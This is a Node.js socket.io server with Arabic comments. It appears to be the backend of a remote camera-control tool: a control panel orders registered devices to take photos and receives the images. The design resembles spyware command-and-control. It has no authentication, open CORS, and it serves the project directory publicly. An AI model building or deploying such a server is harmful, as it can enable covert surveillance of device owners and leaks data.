const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

// إعدادات البيئة
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'uploads')));
app.use(express.static(__dirname)); // للسماح بالوصول لملف control.html

// التأكد من وجود مجلد الصور
fs.ensureDirSync('./uploads');

let clients = {};

// توجيه المتصفح لفتح لوحة التحكم تلقائياً
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'control.html'));
});

io.on('connection', (socket) => {
  console.log('عميل جديد متصل:', socket.id);
  
  // تسجيل الجهاز (التطبيق)
  socket.on('register', (data) => {
    clients[socket.id] = data.deviceId;
    console.log('الجهاز المسجل:', data.deviceId);
    io.emit('clients-update', Object.keys(clients));
  });

  // استقبال أوامر التحكم من المتصفح وإرسالها للتطبيق
  socket.on('capture-photos', (targetId) => {
    io.to(targetId).emit('capture-photos'); 
  });

  // استقبال بيانات الصور من التطبيق وحفظها
  socket.on('photo-data', (encodedImage) => {
    const fileName = `img_${Date.now()}.jpg`;
    const filePath = path.join(__dirname, 'uploads', fileName);
    
    // تحويل Base64 إلى ملف صورة
    fs.writeFile(filePath, encodedImage, 'base64', (err) => {
      if (!err) {
        console.log('تم حفظ الصورة بنجاح:', fileName);
        // إرسال رابط الصورة للوحة التحكم لعرضها فوراً
        io.emit('photos-captured', { front: `/${fileName}` });
      } else {
        console.error('خطأ في حفظ الصورة:', err);
      }
    });
  });

  socket.on('disconnect', () => {
    delete clients[socket.id];
    io.emit('clients-update', Object.keys(clients));
  });
});

// ملاحظة لـ Render: يجب استخدام المنفذ الذي توفره المنصة
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`السيرفر يعمل على المنفذ: ${PORT}`);
});
